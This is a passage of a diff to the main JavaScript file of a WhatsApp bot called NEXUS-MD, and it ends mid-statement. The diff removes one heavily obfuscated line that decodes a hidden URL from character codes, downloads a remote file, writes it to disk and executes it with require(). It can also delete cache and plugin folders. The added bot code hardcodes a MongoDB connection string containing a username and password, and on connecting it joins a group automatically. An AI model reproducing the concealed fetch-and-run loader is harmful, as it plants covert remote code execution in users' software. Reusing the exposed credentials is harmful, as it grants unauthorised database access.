@@ -1,1 +1,827 @@
-const _0x10ce70=_0x16eb;function _0x7114(){const _0x48f867=['pdate...','R\x20v3.1\x20\x20\x20\x20','rupted,\x20re','js...','ECONNRESET','lib','HCqYX','6UWaQCm','ess','🚀\x20Loading\x20','.force-upd','Zlbto','child_proc','.0.0','node_modul','FNDov','ing\x20in\x20PRO','get','sbWrt','cache','DBSBA','path','║\x20\x20\x20\x20\x20NEXU','\x20seems\x20cor','error','statSync','Uncaught\x20E','✅\x20Backup\x20c','ETIMEDOUT','\x20downloade','ed\x20success','UkiaW','includes','ng\x20FORCE\x20u','copyFileSy','conds...','-downloadi','🔗\x20Fetching','unhandledR','EhouV','650hvPqUl','✅\x20Bot\x20load','AWxYL','fromCharCo','unning\x20-','tinuing...','pCFCD','ng\x20update.','4388FzkIzl','3121258kZyIIK','toLocaleTi','log','xTmCS','fFuvU','reated:\x20ne','5wuiAxC','TvjIk','329417yMvQlG','o\x20load\x20bot','✅\x20nexus.js','MKvbx','de\x20║','rHtQo','AnrxV','ZZEKH','VqmAn','ng...','ully...','map','plugins','Shutting\x20d','message','nexus.js.b','own...','375883yuHouZ','nds...','data','╔═════════','ejlns','⚠️\x20Bot\x20file','existsSync','kKIFC','61317FRhAbn','VvLKB','PlZQT','orUCV','start','NEXUS-MD\x20b','dkUaQ','d\x20successf','error,\x20con','NEXUS-MD/6','VYOoS','catch','🗑️\x20Deleted:','xus.js.bac','⚠️\x20Performi','NUcTj','EaZNh','lheGM','meString','ejection','ng\x20in\x205\x20se','xception:','Rejection:','rMzdd','qtIuV','hPqbn','2|3|1|0|5|','QFknw','══════════','jojlp','LOpxU','fully!','vuiRJ','\x20from\x20sour','💓\x20Bot\x20is\x20r','╚═════════','.update-fl','wMabh','🔄\x20Restarti','4506272wtLDrY','\x20\x20\x20║','DUCTION\x20mo','JJwZc','\x20in\x205\x20seco','unlinkSync','ate-flag','YHrBy','║\x20\x20\x20\x20\x20Runn','═══╗','resolve','HyODC','secjX','1175668QsVZtt','nexus.js','Unhandled\x20','text','NpvcW','ackup','exit','ception','axios','join','kup','═══╝','FsGdm','Fatal\x20erro','ync','S-MD\x20LOADE','ully!','ing\x20nexus.','60EygDgW','🔄\x20Retrying','Aehue','ce...','📥\x20Download','pJNpx','writeFileS','ot...','YpiyN','ybtyg','🚀\x20Performi','xuNCo','size','uncaughtEx','own\x20gracef','function','xmcgw','CQOEL','SIGTERM','vXXCS','es/.cache','❌\x20Failed\x20t','SIGINT','split','24SVzoPX','⚠️\x20Network\x20','rmSync'];_0x7114=function(){return _0x48f867;};return _0x7114();}(function(_0x4d0784,_0x4011b2){const _0x1619e1=_0x16eb,_0x271679=_0x4d0784();while(!![]){try{const _0x35e674=parseInt(_0x1619e1(0x248))/(0x336+-0x1045*0x1+-0xb0*-0x13)+parseInt(_0x1619e1(0x22e))/(-0x8c5+-0x1d32+0x25f9*0x1)*(-parseInt(_0x1619e1(0x1e3))/(0x24af*-0x1+0xcc+-0x2*-0x11f3))+parseInt(_0x1619e1(0x1d1))/(0x140e+-0x1db*0x5+-0xac3)*(-parseInt(_0x1619e1(0x235))/(0x1a91+0x21e*0x8+0x1*-0x2b7c))+parseInt(_0x1619e1(0x205))/(-0x140c+-0x143+0x1555)*(parseInt(_0x1619e1(0x22f))/(0xe4f+0x63a*0x1+0x36b*-0x6))+-parseInt(_0x1619e1(0x1c4))/(0x6*-0x48f+-0xd06+-0x2868*-0x1)+-parseInt(_0x1619e1(0x250))/(-0x23a6+-0x16d0+0x3a7f)*(-parseInt(_0x1619e1(0x226))/(0x2517+-0x37*-0x5c+-0x38d1))+-parseInt(_0x1619e1(0x237))/(-0x96b+-0x1*0x2441+-0x2db7*-0x1)*(parseInt(_0x1619e1(0x1fb))/(-0x1*-0x194e+-0xe41+-0xb01));if(_0x35e674===_0x4011b2)break;else _0x271679['push'](_0x271679['shift']());}catch(_0x4031bc){_0x271679['push'](_0x271679['shift']());}}}(_0x7114,0xfafc+-0x819d7+0xbc0fa));const fs=require('fs'),path=require(_0x10ce70(0x213)),axios=require(_0x10ce70(0x1d9)),{execSync}=require(_0x10ce70(0x20a)+_0x10ce70(0x206)),BOT_FILE=path[_0x10ce70(0x1da)](__dirname,_0x10ce70(0x1d2)),UPDATE_FLAG_FILE=path[_0x10ce70(0x1da)](__dirname,_0x10ce70(0x1c1)+'ag'),FORCE_UPDATE_FLAG_FILE=path[_0x10ce70(0x1da)](__dirname,_0x10ce70(0x208)+_0x10ce70(0x1ca));function _0x16eb(_0x160487,_0x47cb06){_0x160487=_0x160487-(-0x1e3c+0x10db+0xf14);const _0x1010e6=_0x7114();let _0x2b13c5=_0x1010e6[_0x160487];return _0x2b13c5;}function getBotUrl(){const _0x113642=_0x10ce70,_0x12e130=[[0xf06+0x18ad+-0x274b,0x1*0x1d05+0x1fa5+0x89a*-0x7,-0xf5*0xd+-0x119b+0x1e80*0x1,0x1139+-0x26c5+0x15fc,-0x1*-0xa9f+-0x1834+0xe08,-0x17b+0x20b0+-0x1efb,0x1*0x25e1+0x4*0x995+0x20e*-0x25,0x1*0x58f+-0x23b6+0x16*0x161],[0x3e5*0x2+0x2*-0x154+-0x7*0xac,-0x48+-0x3f3+-0x4*-0x128,-0x3f*0x26+-0x71+-0xa43*-0x1,0xd2c+0x1*-0xc07+0x8*-0x16,0x1*0x2325+0xa4e+-0xa*0x480,-0x1*-0x51b+0x1bc5+-0x2f9*0xb,-0x18f6+0x197e+0x1*-0x22,-0x8b9+-0x80*0x4+-0x9f*-0x12,-0x1c87+-0x1*0x133+0x1e26,-0x15f4+0x2265*0x1+0xc05*-0x1,-0x1*-0x2381+-0xb8d*0x1+-0x17c7,-0x1a*0xb3+-0x5*-0x45d+-0x115*0x3,0x123c+0x25ba+-0x3794],[0x19c3+-0x1f*-0x56+0x23ff*-0x1,-0x256e+-0x16af+0x3c93,-0xe34+-0x1e1d+0x2cb6,-0xc65+-0x4d5*0x6+0x29d5,0x15f7+0x16df+-0x2c73,0x1833+-0xc3e+-0xb90,-0xd25*0x2+0x295+0x1821*0x1,-0x13f3+0x1b*-0xbf+0x2846,-0x24fc+-0xfd7+0x3534,-0xa*-0xb9+-0x127a+0xbb0,0x6ff+0x341+-0x10*0x9d,-0x1*0x20d4+-0x4a*0x1b+0x28d1],[-0x2440+0x15*0x25+0x2*0x10d0,-0x1381*-0x2+0x1ac2+-0x4156,-0x2587+-0x114a+0x3735,-0x1df9+0x189+-0x1cd5*-0x1,0xb89+0x26a7+-0x31b8,0x157+0x2c*-0xac+0x1c67,-0x1*-0x1df5+0x77a+-0x2505,0x7be+0x1ad7+-0x2222]];return _0x12e130[_0x113642(0x242)](_0x122953=>_0x122953[_0x113642(0x242)](_0x26309d=>String[_0x113642(0x229)+'de'](_0x26309d))[_0x113642(0x1da)](''))[_0x113642(0x1da)]('');}async function downloadBot(){const _0x10dfbd=_0x10ce70,_0x231ce2={'vuiRJ':function(_0x4280d0){return _0x4280d0();},'AWxYL':_0x10dfbd(0x1e7)+_0x10dfbd(0x1e2)+_0x10dfbd(0x201),'dkUaQ':_0x10dfbd(0x223)+_0x10dfbd(0x1be)+_0x10dfbd(0x1e6),'secjX':_0x10dfbd(0x1d4),'kKIFC':_0x10dfbd(0x259)+_0x10dfbd(0x20b),'DBSBA':_0x10dfbd(0x239)+_0x10dfbd(0x21b)+_0x10dfbd(0x257)+_0x10dfbd(0x1e1)},_0x145d63=_0x231ce2[_0x10dfbd(0x1bd)](getBotUrl);console[_0x10dfbd(0x231)](_0x231ce2[_0x10dfbd(0x228)]),console[_0x10dfbd(0x231)](_0x231ce2[_0x10dfbd(0x256)]);const _0x550aea=await axios[_0x10dfbd(0x20f)](_0x145d63,{'responseType':_0x231ce2[_0x10dfbd(0x1d0)],'timeout':0x7530,'headers':{'User-Agent':_0x231ce2[_0x10dfbd(0x24f)]}});return fs[_0x10dfbd(0x1e9)+_0x10dfbd(0x1df)](BOT_FILE,_0x550aea[_0x10dfbd(0x24a)]),console[_0x10dfbd(0x231)](_0x231ce2[_0x10dfbd(0x212)]),!![];}async function performUpdate(){const _0x1e02eb=_0x10ce70,_0x37dc4d={'rHtQo':_0x1e02eb(0x1ed)+_0x1e02eb(0x22d)+'..','AnrxV':_0x1e02eb(0x246)+_0x1e02eb(0x1d6),'fFuvU':_0x1e02eb(0x219)+_0x1e02eb(0x234)+_0x1e02eb(0x25d)+_0x1e02eb(0x1db),'wMabh':function(_0x4ca99e){return _0x4ca99e();}};console[_0x1e02eb(0x231)](_0x37dc4d[_0x1e02eb(0x23c)]);if(fs[_0x1e02eb(0x24e)](BOT_FILE)){const _0x113a86=path[_0x1e02eb(0x1da)](__dirname,_0x37dc4d[_0x1e02eb(0x23d)]);fs[_0x1e02eb(0x220)+'nc'](BOT_FILE,_0x113a86),console[_0x1e02eb(0x231)](_0x37dc4d[_0x1e02eb(0x233)]);}return await _0x37dc4d[_0x1e02eb(0x1c2)](downloadBot),!![];}async function performForceUpdate(){const _0x493d7d=_0x10ce70,_0x3b4c4c={'MKvbx':_0x493d7d(0x25e)+_0x493d7d(0x21f)+_0x493d7d(0x1fe),'ZZEKH':_0x493d7d(0x203),'FNDov':_0x493d7d(0x243),'sbWrt':_0x493d7d(0x20c)+_0x493d7d(0x1f7),'LOpxU':function(_0x2874e8){return _0x2874e8();}};console[_0x493d7d(0x231)](_0x3b4c4c[_0x493d7d(0x23a)]);const _0x3b1199=[_0x3b4c4c[_0x493d7d(0x23e)],_0x3b4c4c[_0x493d7d(0x20d)],_0x3b4c4c[_0x493d7d(0x210)]];for(const _0x4bccb5 of _0x3b1199){const _0x323ebd=path[_0x493d7d(0x1da)](__dirname,_0x4bccb5);fs[_0x493d7d(0x24e)](_0x323ebd)&&(fs[_0x493d7d(0x1fd)](_0x323ebd,{'recursive':!![],'force':!![]}),console[_0x493d7d(0x231)](_0x493d7d(0x25c)+'\x20'+_0x4bccb5));}return await _0x3b4c4c[_0x493d7d(0x1bb)](downloadBot),!![];}async function checkForSignals(){const _0x4f1e31=_0x10ce70,_0x1a0bee={'EhouV':function(_0x50bc69){return _0x50bc69();}};if(fs[_0x4f1e31(0x24e)](FORCE_UPDATE_FLAG_FILE))return fs[_0x4f1e31(0x1c9)](FORCE_UPDATE_FLAG_FILE),await _0x1a0bee[_0x4f1e31(0x225)](performForceUpdate),!![];if(fs[_0x4f1e31(0x24e)](UPDATE_FLAG_FILE))return fs[_0x4f1e31(0x1c9)](UPDATE_FLAG_FILE),await _0x1a0bee[_0x4f1e31(0x225)](performUpdate),!![];return![];}async function startBot(){const _0xfae3fd=_0x10ce70,_0x3a6d16={'xTmCS':_0xfae3fd(0x1bf)+_0xfae3fd(0x22a),'TvjIk':function(_0x2f9a1e,_0x3af59e){return _0x2f9a1e(_0x3af59e);},'PlZQT':_0xfae3fd(0x244)+_0xfae3fd(0x247),'hPqbn':function(_0xeca9a2){return _0xeca9a2();},'VvLKB':function(_0x34c34b,_0x2bf6b8){return _0x34c34b<_0x2bf6b8;},'CQOEL':_0xfae3fd(0x24d)+_0xfae3fd(0x215)+_0xfae3fd(0x200)+_0xfae3fd(0x222)+_0xfae3fd(0x240),'HCqYX':function(_0x570e97){return _0x570e97();},'Aehue':_0xfae3fd(0x207)+_0xfae3fd(0x255)+_0xfae3fd(0x1ea),'xuNCo':_0xfae3fd(0x227)+_0xfae3fd(0x21c)+_0xfae3fd(0x1bc),'rMzdd':function(_0x59f254,_0x182ca9){return _0x59f254===_0x182ca9;},'lheGM':_0xfae3fd(0x1f2),'VqmAn':function(_0x549626,_0x48a2fc,_0x2c1fd2){return _0x549626(_0x48a2fc,_0x2c1fd2);},'YpiyN':_0xfae3fd(0x1f9),'ybtyg':_0xfae3fd(0x1f8)+_0xfae3fd(0x238)+':','UkiaW':_0xfae3fd(0x1e4)+_0xfae3fd(0x1c8)+_0xfae3fd(0x249)};!fs[_0xfae3fd(0x24e)](BOT_FILE)&&await _0x3a6d16[_0xfae3fd(0x1b6)](downloadBot);const _0x1fe360=fs[_0xfae3fd(0x217)](BOT_FILE);_0x3a6d16[_0xfae3fd(0x251)](_0x1fe360[_0xfae3fd(0x1ef)],0x7*0xf+0x11d9*-0x1+0x11d4*0x1)&&(console[_0xfae3fd(0x231)](_0x3a6d16[_0xfae3fd(0x1f4)]),await _0x3a6d16[_0xfae3fd(0x204)](downloadBot));console[_0xfae3fd(0x231)](_0x3a6d16[_0xfae3fd(0x1e5)]);try{delete require[_0xfae3fd(0x211)][require[_0xfae3fd(0x1ce)](BOT_FILE)];const _0x3183a9=_0x3a6d16[_0xfae3fd(0x236)](require,BOT_FILE);console[_0xfae3fd(0x231)](_0x3a6d16[_0xfae3fd(0x1ee)]);_0x3183a9&&_0x3a6d16[_0xfae3fd(0x1b4)](typeof _0x3183a9[_0xfae3fd(0x254)],_0x3a6d16[_0xfae3fd(0x261)])&&_0x3183a9[_0xfae3fd(0x254)]();const _0x3de2f7=_0x3a6d16[_0xfae3fd(0x23f)](setInterval,()=>{const _0x2e9e25=_0xfae3fd;console[_0x2e9e25(0x231)](_0x3a6d16[_0x2e9e25(0x232)],new Date()[_0x2e9e25(0x230)+_0x2e9e25(0x262)]());},0xd8716+-0x2*0x29e6d+0x3cb*0xc4c);process['on'](_0x3a6d16[_0xfae3fd(0x1eb)],()=>{const _0x2db3a9=_0xfae3fd;_0x3a6d16[_0x2db3a9(0x236)](clearInterval,_0x3de2f7),console[_0x2db3a9(0x231)](_0x3a6d16[_0x2db3a9(0x252)]),process[_0x2db3a9(0x1d7)](0x2a0+-0x2*0xfda+0x1d14);});}catch(_0x3d4ea7){console[_0xfae3fd(0x216)](_0x3a6d16[_0xfae3fd(0x1ec)],_0x3d4ea7[_0xfae3fd(0x245)]),console[_0xfae3fd(0x231)](_0x3a6d16[_0xfae3fd(0x21d)]),_0x3a6d16[_0xfae3fd(0x23f)](setTimeout,()=>startBot(),-0x2e*0x37+0xdf3+-0xf77*-0x1);}}async function main(){const _0x4c8a75=_0x10ce70,_0x31a282={'orUCV':_0x4c8a75(0x1b7)+'4','pCFCD':_0x4c8a75(0x1c0)+_0x4c8a75(0x1b9)+_0x4c8a75(0x1b9)+_0x4c8a75(0x1dc),'pJNpx':_0x4c8a75(0x1cc)+_0x4c8a75(0x20e)+_0x4c8a75(0x1c6)+_0x4c8a75(0x23b),'jojlp':_0x4c8a75(0x24b)+_0x4c8a75(0x1b9)+_0x4c8a75(0x1b9)+_0x4c8a75(0x1cd),'QFknw':_0x4c8a75(0x214)+_0x4c8a75(0x1e0)+_0x4c8a75(0x1ff)+_0x4c8a75(0x1c5),'NUcTj':function(_0x41ee59){return _0x41ee59();}},_0x52d417=_0x31a282[_0x4c8a75(0x253)][_0x4c8a75(0x1fa)]('|');let _0x3f9bb4=0xc2*0x23+-0x254d+-0xac7*-0x1;while(!![]){switch(_0x52d417[_0x3f9bb4++]){case'0':console[_0x4c8a75(0x231)](_0x31a282[_0x4c8a75(0x22c)]);continue;case'1':console[_0x4c8a75(0x231)](_0x31a282[_0x4c8a75(0x1e8)]);continue;case'2':console[_0x4c8a75(0x231)](_0x31a282[_0x4c8a75(0x1ba)]);continue;case'3':console[_0x4c8a75(0x231)](_0x31a282[_0x4c8a75(0x1b8)]);continue;case'4':await _0x31a282[_0x4c8a75(0x25f)](startBot);continue;case'5':await _0x31a282[_0x4c8a75(0x25f)](checkForSignals);continue;}break;}}process['on'](_0x10ce70(0x1f0)+_0x10ce70(0x1d8),_0x20a1b9=>{const _0x679bd2=_0x10ce70,_0x380f8b={'YHrBy':_0x679bd2(0x202),'qtIuV':_0x679bd2(0x21a),'JJwZc':_0x679bd2(0x1fc)+_0x679bd2(0x258)+_0x679bd2(0x22b),'Zlbto':_0x679bd2(0x218)+_0x679bd2(0x265),'ejlns':_0x679bd2(0x1c3)+_0x679bd2(0x264)+_0x679bd2(0x221),'FsGdm':function(_0x5f5d35,_0x10a004,_0xa7152c){return _0x5f5d35(_0x10a004,_0xa7152c);}};_0x20a1b9[_0x679bd2(0x245)][_0x679bd2(0x21e)](_0x380f8b[_0x679bd2(0x1cb)])||_0x20a1b9[_0x679bd2(0x245)][_0x679bd2(0x21e)](_0x380f8b[_0x679bd2(0x1b5)])?console[_0x679bd2(0x231)](_0x380f8b[_0x679bd2(0x1c7)]):(console[_0x679bd2(0x216)](_0x380f8b[_0x679bd2(0x209)],_0x20a1b9[_0x679bd2(0x245)]),console[_0x679bd2(0x231)](_0x380f8b[_0x679bd2(0x24c)]),_0x380f8b[_0x679bd2(0x1dd)](setTimeout,()=>process[_0x679bd2(0x1d7)](-0x3*-0x79f+0x1ed0+-0x35ac),0x4*-0x871+-0xbcb+0x4117));}),process['on'](_0x10ce70(0x1f9),()=>{const _0x4b8810=_0x10ce70,_0x20f898={'vXXCS':_0x4b8810(0x244)+_0x4b8810(0x1f1)+_0x4b8810(0x241)};console[_0x4b8810(0x231)](_0x20f898[_0x4b8810(0x1f6)]),process[_0x4b8810(0x1d7)](-0x10c4*-0x2+-0x1*-0xcf6+0x21d*-0x16);}),process['on'](_0x10ce70(0x1f5),()=>{const _0x1b20e1=_0x10ce70,_0x52532a={'xmcgw':_0x1b20e1(0x244)+_0x1b20e1(0x1f1)+_0x1b20e1(0x241)};console[_0x1b20e1(0x231)](_0x52532a[_0x1b20e1(0x1f3)]),process[_0x1b20e1(0x1d7)](0x133d+-0xc57+-0x6e6);}),process['on'](_0x10ce70(0x224)+_0x10ce70(0x263),_0x29efe8=>{const _0x5ce137=_0x10ce70,_0x23f3a0={'NpvcW':_0x5ce137(0x1d3)+_0x5ce137(0x1b3)};console[_0x5ce137(0x231)](_0x23f3a0[_0x5ce137(0x1d5)],_0x29efe8);}),main()[_0x10ce70(0x25b)](_0x45d28c=>{const _0x581321=_0x10ce70,_0x5b1f96={'HyODC':_0x581321(0x1de)+'r:','EaZNh':_0x581321(0x1c3)+_0x581321(0x264)+_0x581321(0x221),'VYOoS':function(_0x6bc91c,_0x3b8ebf,_0x2b4924){return _0x6bc91c(_0x3b8ebf,_0x2b4924);}};console[_0x581321(0x216)](_0x5b1f96[_0x581321(0x1cf)],_0x45d28c[_0x581321(0x245)]),console[_0x581321(0x231)](_0x5b1f96[_0x581321(0x260)]),_0x5b1f96[_0x581321(0x25a)](setTimeout,()=>process[_0x581321(0x1d7)](0x185c+0x1*0x1e88+0x1*-0x36e3),-0x39f*-0x6+-0x15b2+0x27*0x80);});
+// ========== 403 ERROR TRACKER - MUST BE FIRST ==========
+const { setup403Tracker } = require('./tracker.js');
+setup403Tracker();
+// ========================================================
+
+// ========== FIX MAXLISTENERS WARNING - UNLIMITED ==========
+const { EventEmitter } = require('events');
+const tls = require('tls');
+
+EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
+
+if (tls.TLSSocket && tls.TLSSocket.prototype) {
+    tls.TLSSocket.prototype.setMaxListeners = function(n) {
+        this._maxListeners = 0;
+        return this;
+    };
+    tls.TLSSocket.prototype._maxListeners = 0;
+}
+// ============================================================
+
+const ownerReact = '👾';
+
+const {
+    default: makeWASocket,
+    getAggregateVotesInPollMessage, 
+    useMultiFileAuthState,
+    DisconnectReason,
+    getDevice,
+    fetchLatestBaileysVersion,
+    jidNormalizedUser,
+    getContentType,
+    Browsers,
+    makeInMemoryStore,
+    makeCacheableSignalKeyStore,
+    downloadContentFromMessage,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    prepareWAMessageMedia,
+    proto
+} = require('@whiskeysockets/baileys');
+const fs = require('fs');
+const P = require('pino');
+const config = require('./config');
+const qrcode = require('qrcode-terminal');
+const NodeCache = require('node-cache');
+const util = require('util');
+const axios = require('axios');
+const { File } = require('megajs');
+const path = require('path');
+const express = require('express');
+const mongoose = require('mongoose');
+const msgRetryCounterCache = new NodeCache();
+const FileType = require('file-type');
+const l = console.log;
+
+// ==================== MULTI-SESSION MONGODB SETUP ====================
+const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://ARmfHjXz:YiSbuJIMvWfjA95M@us-east-1.ufsuw.mongodb.net/Sadasnew';
+const SESSION_BASE_PATH = './sessions';
+const activeSockets = {};
+const keepAliveTimers = {};
+const reconnectTimers = {};
+const fileCache = {};
+const saveDebounceTimers = {};
+
+// Session Schema for MongoDB
+const SessionSchema = new mongoose.Schema({
+    sessionId: { type: String, unique: true },
+    data: Object,
+    createdAt: { type: Date, default: Date.now },
+    updatedAt: { type: Date, default: Date.now }
+});
+const Session = mongoose.model('Session', SessionSchema);
+
+// Connect to MongoDB
+mongoose.connect(MONGODB_URI)
+    .then(() => console.log('✅ MongoDB Connected for Multi-Session'))
+    .catch(err => console.log('❌ MongoDB Error:', err));
+
+// ==================== SESSION MANAGEMENT FUNCTIONS ====================
+function cleanupSession(sessionId) {
+    if (keepAliveTimers[sessionId]) {
+        clearInterval(keepAliveTimers[sessionId]);
+        delete keepAliveTimers[sessionId];
+    }
+    if (reconnectTimers[sessionId]) {
+        clearTimeout(reconnectTimers[sessionId]);
+        delete reconnectTimers[sessionId];
+    }
+    if (saveDebounceTimers[sessionId]) {
+        clearTimeout(saveDebounceTimers[sessionId]);
+        delete saveDebounceTimers[sessionId];
+    }
+    const sock = activeSockets[sessionId];
+    if (sock) {
+        try {
+            sock.ev.removeAllListeners();
+            sock.ws?.terminate?.();
+        } catch (e) {}
+        delete activeSockets[sessionId];
+    }
+}
+
+async function restoreSession(sessionId, sessionPath) {
+    try {
+        const session = await Session.findOne({ sessionId });
+        if (!session) return false;
+        await fs.ensureDir(sessionPath);
+        for (const file in session.data) {
+            await fs.writeFile(path.join(sessionPath, file), session.data[file]);
+        }
+        console.log('✅ Session Restored:', sessionId);
+        return true;
+    } catch (err) {
+        console.error('Restore error:', err);
+        return false;
+    }
+}
+
+async function saveSession(sessionId, sessionPath) {
+    try {
+        const files = await fs.readdir(sessionPath);
+        let data = {};
+        let hasChanges = false;
+
+        for (const file of files) {
+            try {
+                const content = await fs.readFile(path.join(sessionPath, file), 'utf-8');
+                const cacheKey = `${sessionId}:${file}`;
+                if (fileCache[cacheKey] !== content) {
+                    fileCache[cacheKey] = content;
+                    hasChanges = true;
+                }
+                data[file] = content;
+            } catch (e) {}
+        }
+
+        if (!hasChanges) {
+            console.log('No changes, skipping DB write:', sessionId);
+            return;
+        }
+
+        await Session.findOneAndUpdate(
+            { sessionId }, 
+            { data, updatedAt: Date.now() }, 
+            { upsert: true }
+        );
+        console.log('💾 Session saved:', sessionId);
+    } catch (err) {
+        console.error('SaveSession error:', err);
+    }
+}
+
+function debouncedSaveSession(sessionId, sessionPath) {
+    if (saveDebounceTimers[sessionId]) {
+        clearTimeout(saveDebounceTimers[sessionId]);
+    }
+    saveDebounceTimers[sessionId] = setTimeout(async () => {
+        delete saveDebounceTimers[sessionId];
+        await saveSession(sessionId, sessionPath);
+    }, 5000);
+}
+
+// ==================== PAIRING FUNCTION (Base 1 Style) ====================
+async function Pair(number, res = null) {
+    const xnumber = number.replace(/[^0-9]/g, '');
+    const sessionId = `nexus_${xnumber}`;
+    const sessionPath = path.join(SESSION_BASE_PATH, sessionId);
+
+    if (activeSockets[sessionId]) {
+        console.log('Socket already active for:', sessionId);
+        if (res && !res.headersSent) res.json({ error: 'Session already active. Please wait.' });
+        return;
+    }
+
+    try {
+        await fs.ensureDir(sessionPath);
+        await restoreSession(sessionId, sessionPath);
+
+        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+        const { version } = await fetchLatestBaileysVersion();
+        const logger = P({ level: 'silent' });
+
+        const sock = makeWASocket({
+            version,
+            logger,
+            auth: {
+                creds: state.creds,
+                keys: makeCacheableSignalKeyStore(state.keys, logger),
+            },
+            printQRInTerminal: false,
+            generateHighQualityLinkPreview: true,
+            syncFullHistory: false,
+            connectTimeoutMs: 60000,
+            defaultQueryTimeoutMs: 30000,
+            keepAliveIntervalMs: 30000,
+            msgRetryCounterCache,
+            browser: ["NEXUS-MD", "Chrome", "3.0.0"]
+        });
+
+        activeSockets[sessionId] = sock;
+
+        let pairingCode = null;
+        let responded = false;
+
+        if (!sock.authState.creds.registered) {
+            try {
+                await new Promise(r => setTimeout(r, 3000));
+                pairingCode = await sock.requestPairingCode(xnumber);
+                console.log('Pairing Code:', pairingCode);
+                if (res && !res.headersSent) { 
+                    res.json({ code: pairingCode, sessionId: sessionId }); 
+                    responded = true; 
+                }
+            } catch (pairErr) {
+                console.error('Pairing code request failed:', pairErr);
+                if (res && !res.headersSent) { 
+                    res.json({ error: 'Failed to generate pairing code. Try again.' }); 
+                    responded = true; 
+                }
+                cleanupSession(sessionId);
+                return;
+            }
+        } else {
+            console.log('Already registered:', sessionId);
+            if (res && !res.headersSent) { 
+                res.json({ error: 'This number is already paired.', sessionId: sessionId }); 
+                responded = true; 
+            }
+        }
+
+        if (res && !responded) {
+            setTimeout(() => {
+                if (!res.headersSent) res.json({ error: 'Pairing timed out. Try again.' });
+            }, 15000);
+        }
+
+        // ========== BASE 2 FEATURES ==========
+        // Add all Base 2 helper functions to socket
+        sock.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+            const r = await axios.head(url);
+            const mime = r.headers['content-type'];
+            if (mime.split("/")[1] === "gif")
+                return sock.sendMessage(jid, { video: await getBuffer(url), caption, gifPlayback: true, ...options }, { quoted });
+            if (mime === "application/pdf")
+                return sock.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption, ...options }, { quoted });
+            if (mime.split("/")[0] === "image")
+                return sock.sendMessage(jid, { image: await getBuffer(url), caption, ...options }, { quoted });
+            if (mime.split("/")[0] === "video")
+                return sock.sendMessage(jid, { video: await getBuffer(url), caption, mimetype: 'video/mp4', ...options }, { quoted });
+            if (mime.split("/")[0] === "audio")
+                return sock.sendMessage(jid, { audio: await getBuffer(url), caption, mimetype: 'audio/mpeg', ...options }, { quoted });
+        };
+
+        sock.edite = async (gg, newmg) => {
+            await sock.relayMessage(gg.key.remoteJid, {
+                protocolMessage: { key: gg.key, type: 14, editedMessage: { conversation: newmg } }
+            }, {});
+        };
+
+        sock.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
+            if (!message || !message.message) return;
+            let mtype = message.message ? Object.keys(message.message)[0] : null;
+            if (!mtype) return;
+            let content = await generateForwardMessageContent(message, forceForward);
+            if (!content) return;
+            let ctype = Object.keys(content)[0];
+            let context = mtype != "conversation" ? message.message[mtype]?.contextInfo || {} : {};
+            content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
+            const waMessage = await generateWAMessageFromContent(jid, content, options || {});
+            await sock.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
+            return waMessage;
+        };
+
+        // Button & List Message Functions (Base 2)
+        sock.buttonMessage = async (jid, msgData, quotemek) => {
+            if (!msgData.buttons) return;
+            let result = "";
+            const CMD_ID_MAP = [];
+            msgData.buttons.forEach((button, bttnIndex) => {
+                const mainNumber = `${bttnIndex + 1}`;
+                result += `\n*${mainNumber}* || ${button.buttonText.displayText}`;
+                CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
+            });
+            const buttonMessage = `${msgData.caption || msgData.text}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer || ''}`;
+            const textmsg = await sock.sendMessage(jid, { image: msgData.image, caption: buttonMessage }, { quoted: quotemek || mek });
+            await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
+        };
+
+        sock.listMessage = async (jid, msgData, quotemek) => {
+            if (!msgData.sections) return;
+            let result = "";
+            const CMD_ID_MAP = [];
+            msgData.sections.forEach((section, sectionIndex) => {
+                const mainNumber = `${sectionIndex + 1}`;
+                result += `\n*${section.title}*\n\n`;
+                section.rows.forEach((row, rowIndex) => {
+                    const subNumber = `${mainNumber}.${rowIndex + 1}`;
+                    result += `*${subNumber}* || ${row.title}\n`;
+                    if (row.description) result += `   ${row.description}\n\n`;
+                    CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+                });
+            });
+            const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer || ''}`;
+            const text = await sock.sendMessage(jid, { text: listMessage }, { quoted: quotemek || mek });
+            await updateCMDStore(text.key.id, CMD_ID_MAP);
+        };
+
+        sock.ev.on('creds.update', async () => {
+            await saveCreds();
+            debouncedSaveSession(sessionId, sessionPath);
+        });
+
+        sock.ev.on('connection.update', async (update) => {
+            const { connection, lastDisconnect } = update;
+            if (connection === 'close') {
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                const isLoggedOut = statusCode === DisconnectReason.loggedOut;
+                console.log(`Disconnected: ${sessionId} | Code: ${statusCode}`);
+                cleanupSession(sessionId);
+                if (!isLoggedOut) {
+                    console.log('Reconnecting:', sessionId);
+                    reconnectTimers[sessionId] = setTimeout(() => Pair(number), 5000);
+                } else {
+                    console.log('Logged out:', sessionId);
+                    await Session.findOneAndDelete({ sessionId });
+                    await fs.remove(sessionPath);
+                }
+            } else if (connection === 'open') {
+                console.log('✅ Connected:', sessionId);
+                
+                // Auto-join support group (Base 2 feature)
+                await autoJoinGroup(sock);
+                
+                keepAliveTimers[sessionId] = setInterval(async () => {
+                    if (!activeSockets[sessionId]) {
+                        clearInterval(keepAliveTimers[sessionId]);
+                        delete keepAliveTimers[sessionId];
+                        return;
+                    }
+                    sock.sendPresenceUpdate('available', sock.user.id).catch(() => {
+                        cleanupSession(sessionId);
+                        reconnectTimers[sessionId] = setTimeout(() => Pair(number), 3000);
+                    });
+                }, 30000);
+
+                try {
+                    const jid = xnumber + '@s.whatsapp.net';
+                    await sock.sendMessage(jid, {
